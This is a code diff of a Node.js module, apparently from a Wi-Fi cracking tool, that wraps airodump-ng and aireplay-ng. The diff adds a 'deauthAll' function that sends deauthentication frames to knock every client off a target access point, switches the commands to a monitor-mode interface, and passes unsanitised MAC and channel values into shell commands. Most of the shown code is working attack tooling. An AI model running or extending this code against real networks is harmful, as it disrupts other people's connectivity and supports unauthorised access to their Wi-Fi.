@@ -20,7 +20,7 @@ function init(i, s, m, c) {
 	channel = c;
 	cleanup();
     io = i;
-	const command = `cd /tmp/ngcrack_output && airodump-ng --bssid ${mac} -c ${channel} -w clients wlan1 >> /dev/null`;
+	const command = `cd /tmp/ngcrack_output && airodump-ng --bssid ${mac} -c ${channel} -w clients wlan1mon >> /dev/null`;
 
     airodumpProcess = spawn(command, {
         shell: true
@@ -189,9 +189,20 @@ function monitorLatestScanFile() {
   });
 }
 
+function deauthAll(i, ssid, mac, channel) {
+	execSync(`iwconfig wlan1mon channel ${channel}`);
+	const command = `aireplay-ng --deauth 10 -a ${mac} wlan1mon`;
+	exec(command, (error, stdout, stderr) => {
+	  if (error) {
+		return;
+	  }
+	});
+	console.log(command);
+
+}
 
 function deauth(i, ssid, mac, channel, target) {
-	
+	/*
 	
 		// Path to your .netxml file
 const filePath = '/tmp/ngcrack_output/clients-30.kismet.netxml';
@@ -222,6 +233,7 @@ fs.readFile(filePath, (err, data) => {
   });
 });
 	
+	*/
 	
 	
 	
@@ -234,9 +246,8 @@ fs.readFile(filePath, (err, data) => {
 	
 	
 	
-	
-	execSync(`iwconfig wlan1 channel ${channel}`);
-	const command = `aireplay-ng --deauth 10 -a ${mac} -c ${target} wlan1`;
+	execSync(`iwconfig wlan1mon channel ${channel}`);
+	const command = `aireplay-ng --deauth 10 -a ${mac} -c ${target} wlan1mon`;
 	exec(command, (error, stdout, stderr) => {
 	  if (error) {
 		return;
@@ -252,5 +263,6 @@ module.exports = {
   init,
   cleanup,
   deauth,
+  deauthAll,
   startSniff
 };
